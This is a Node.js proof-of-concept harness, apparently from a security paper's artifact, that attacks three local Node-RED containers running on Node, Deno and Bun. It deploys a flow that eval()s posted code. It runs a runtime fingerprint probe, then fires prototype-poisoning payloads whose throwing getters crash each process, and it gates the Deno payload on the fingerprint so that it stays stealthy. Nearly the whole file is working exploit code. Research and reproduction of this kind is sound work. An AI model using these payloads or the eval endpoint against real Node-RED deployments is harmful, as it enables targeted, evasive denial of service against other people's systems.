// Live inspector for the three running Node-RED victims — a reviewer-facing
// confirmation layer. Two modes:
//
//   node inspect.mjs                    (default: "probe")
//       Non-destructive. Restart+deploy each instance, run the EXACT fingerprint
//       PROBE from driver.mjs against the live sandbox, and print the raw JSON it
//       returns (introspection + fingerprint signals + inferred runtime). Leaves
//       all three UP. This shows the fingerprint is real, straight off the wire.
//
//   node inspect.mjs detonate <rt> [target]
//       Fire runtime <rt>'s own payload at its instance (or at `target`, to show
//       stealth), then print health (DOWN/UP) and the last container log lines —
//       so you can SEE the uncaught-exception process death. Run `bash reset.sh`
//       afterward. e.g.  node inspect.mjs detonate node
//                        node inspect.mjs detonate node deno   (inert -> stays UP)
//
// Source of truth: the PROBE string is EXTRACTED from driver.mjs at runtime (not
// copied), so this inspector provably exercises the same Fig. 7 fingerprint the PoC
// does. The payload strings mirror driver.mjs and are guarded against drift below.
import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import http from 'node:http';

const DIR = import.meta.dirname;
const RT = {
  node: { svc: 'nr-node', port: 1881 },
  deno: { svc: 'nr-deno', port: 1882 },
  bun:  { svc: 'nr-bun',  port: 1893 },
};
const RTS = Object.keys(RT);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// --- single source of truth: pull the PROBE verbatim out of driver.mjs ---
const driverSrc = readFileSync(`${DIR}/driver.mjs`, 'utf8');
const PROBE = (driverSrc.match(/const PROBE = `([\s\S]*?)`;/) || [])[1];
if (!PROBE) { console.error('could not extract PROBE from driver.mjs — did it move?'); process.exit(1); }
// paper Fig. 7 fingerprint decision, from the probe's raw signals
const infer = (fp) => !fp ? 'unknown' : (!fp.callsite ? 'node' : (fp.afn === 2 ? 'bun' : 'deno'));

// paper Fig. 7 fingerprint as a one-line expr returning 'node'|'deno'|'bun'
// (used to fingerprint-gate the Deno payload, exactly as driver.mjs does).
const FP_RT = "(function(){ var cs,o=Error.prepareStackTrace; try{Error.prepareStackTrace=function(e,s){return s;};var C=Error().stack[0].constructor;new C(C,6).toString();cs=true;}catch(e){cs=false;}finally{Error.prepareStackTrace=o;} var afn;try{afn=Intl.NumberFormat([],{style:'currency',currency:'AFN'}).resolvedOptions().minimumFractionDigits;}catch(e){afn=-1;} return !cs?'node':(afn===2?'bun':'deno'); })()";

// --- payloads: mirror of driver.mjs PAYLOADS, guarded so drift fails loudly ---
const POISON = (name, desc) => `Object.defineProperty(Object.getPrototypeOf(msg),${JSON.stringify(name)},${desc})`;
const PAYLOADS = {
  node: POISON('chunkedEncoding', `{get(){throw new Error('ce')},configurable:true}`),
  bun:  POISON('headers', `{get(){throw new Error('hp')},configurable:true}`),
  deno: `if (${FP_RT} === 'deno') { ${POISON('_readableState', `{get(){throw new Error('rs')},configurable:true}`)} }`,
};
for (const tok of ['getPrototypeOf(msg)', "'chunkedEncoding'", "'headers'", "'_readableState'", 'prepareStackTrace']) {
  if (!driverSrc.includes(tok)) { console.error(`DRIFT: driver.mjs no longer contains ${tok}; update inspect.mjs.`); process.exit(1); }
}

const FLOW = [
  { id: 'tab1', type: 'tab', label: 'poc' },
  { id: 'in_run', type: 'http in', z: 'tab1', url: '/run', method: 'post', wires: [['fn_run']] },
  { id: 'fn_run', type: 'function', z: 'tab1', name: 'run',
    func: "let code=(msg.payload&&msg.payload.code)||'';try{msg.payload=String(eval(code));}catch(e){msg.payload='ERR:'+(e&&e.message);}return msg;",
    outputs: 1, wires: [['resp_run']] },
  { id: 'resp_run', type: 'http response', z: 'tab1', statusCode: '200' },
];

function req(port, method, path, body, ms = 6000) {
  return new Promise((resolve) => {
    const data = body ? JSON.stringify(body) : null;
    const headers = { 'Content-Type': 'application/json' };
    if (path === '/flows') headers['Node-RED-Deployment-Type'] = 'full';
    if (data) headers['Content-Length'] = Buffer.byteLength(data);
    const r = http.request({ host: '127.0.0.1', port, path, method, agent: false, headers }, (res) => {
      let d = ''; res.on('data', (c) => (d += c)); res.on('end', () => resolve({ status: res.statusCode, text: d }));
    });
    r.on('error', (e) => resolve({ status: 0, text: 'ERR:' + e.code }));
    r.setTimeout(ms, () => { r.destroy(); resolve({ status: 0, text: 'TIMEOUT' }); });
    if (data) r.write(data); r.end();
  });
}
const restart = (svc) => execFileSync('docker', ['compose', 'restart', svc], { cwd: DIR, stdio: 'ignore' });
const logs = (svc, n = 15) => { try { return execFileSync('docker', ['compose', 'logs', '--tail=' + n, svc], { cwd: DIR }).toString(); } catch { return '(no logs)'; } };
async function waitUp(port, tries = 60) { for (let i = 0; i < tries; i++) { const r = await req(port, 'GET', '/settings', null, 1500); if (r.status === 200) return true; await sleep(1000); } return false; }
async function waitDown(port, tries = 10) { for (let i = 0; i < tries; i++) { const r = await req(port, 'GET', '/settings', null, 1200); if (r.status !== 200) return true; await sleep(400); } return false; }
async function version(port) { const r = await req(port, 'GET', '/settings', null, 1500); try { return JSON.parse(r.text).version || '?'; } catch { return '?'; } }
async function freshDeploy(rt) { const { svc, port } = RT[rt]; restart(svc); if (!(await waitUp(port))) return false; await req(port, 'POST', '/flows', FLOW); await sleep(800); return true; }

async function probe() {
  console.log('\n=== LIVE fingerprint of the running instances (non-destructive) ===');
  console.log('PROBE (extracted verbatim from driver.mjs — paper Fig. 7 fingerprint) submitted to each sandbox:\n');
  console.log(PROBE.split('\n').map((l) => '    ' + l).join('\n'), '\n');
  let correct = 0;
  for (const rt of RTS) {
    const { port } = RT[rt];
    if (!(await freshDeploy(rt))) { console.log(`  ${rt}: did not come up`); continue; }
    const ver = await version(port);
    const r = await req(port, 'POST', '/run', { code: PROBE });
    let p = null; try { p = JSON.parse(r.text); } catch {}
    const inferred = infer(p?.fp);
    if (inferred === rt) correct++;
    console.log(`  ── ${rt.toUpperCase()}  (http://127.0.0.1:${port}/  · Node-RED ${ver}) ──`);
    console.log(`     introspection (raw): ${JSON.stringify(p?.intro)}`);
    console.log(`     fingerprint  (raw): ${JSON.stringify(p?.fp)}`);
    console.log(`     inferred runtime  : ${inferred}  (truth ${rt})  ${inferred === rt ? 'OK ✅' : 'WRONG ❌'}\n`);
  }
  console.log(`fingerprint accuracy: ${correct}/${RTS.length}   (instances left UP — open the editor URLs above to poke them by hand)`);
}

async function detonate(prt, drt) {
  drt = drt || prt;
  if (!RT[prt] || !RT[drt]) { console.error(`usage: node inspect.mjs detonate <node|deno|bun> [target]`); process.exit(1); }
  const { svc, port } = RT[drt];
  console.log(`\n=== LIVE detonation: ${prt} payload -> ${drt} instance (http://127.0.0.1:${port}/) ===`);
  if (!(await freshDeploy(drt))) { console.log('  target did not come up'); return; }
  console.log(`  health before: ${(await req(port, 'GET', '/settings')).status === 200 ? 'UP' : 'DOWN'}`);
  console.log(`  submitting payload: ${PAYLOADS[prt]}`);
  await req(port, 'POST', '/run', { code: PAYLOADS[prt] }, 4000);
  const down = await waitDown(port);
  console.log(`  health after : ${down ? 'DOWN 💥' : 'UP (inert — expected when payload != target)'}`);
  console.log(`\n  --- last container logs (${svc}) — look for the uncaught exception ---`);
  console.log(logs(svc).split('\n').map((l) => '    ' + l).join('\n'));
  console.log(`\n  reset when done:  bash reset.sh ${drt}`);
}

const [cmd, a, b] = process.argv.slice(2);
if (cmd === 'detonate') detonate(a, b).catch((e) => { console.error(e); process.exit(1); });
else probe().catch((e) => { console.error(e); process.exit(1); });
